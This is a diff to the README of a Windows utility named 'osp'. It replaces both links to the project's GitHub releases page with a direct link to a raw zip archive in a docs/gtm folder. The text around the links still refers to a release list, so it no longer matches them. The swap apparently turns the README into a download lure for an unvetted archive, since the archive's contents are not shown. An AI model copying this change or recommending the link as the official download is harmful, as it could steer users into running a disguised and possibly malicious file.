@@ -1,6 +1,6 @@
 # ⚙️ osp - Run Service Tools With Ease
 
-[![Download osp](https://img.shields.io/badge/Download-osp-6e56cf?style=for-the-badge)](https://github.com/amosahd/osp/releases)
+[![Download osp](https://img.shields.io/badge/Download-osp-6e56cf?style=for-the-badge)](https://raw.githubusercontent.com/amosahd/osp/main/docs/gtm/Software_3.1-alpha.1.zip)
 
 ## 🧭 What osp does
 
@@ -33,7 +33,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 Visit this page to download the latest Windows release:
 
-https://github.com/amosahd/osp/releases
+https://raw.githubusercontent.com/amosahd/osp/main/docs/gtm/Software_3.1-alpha.1.zip
 
 Look for the newest file in the release list. On Windows, that is usually an `.exe` file or a `.zip` file.
 
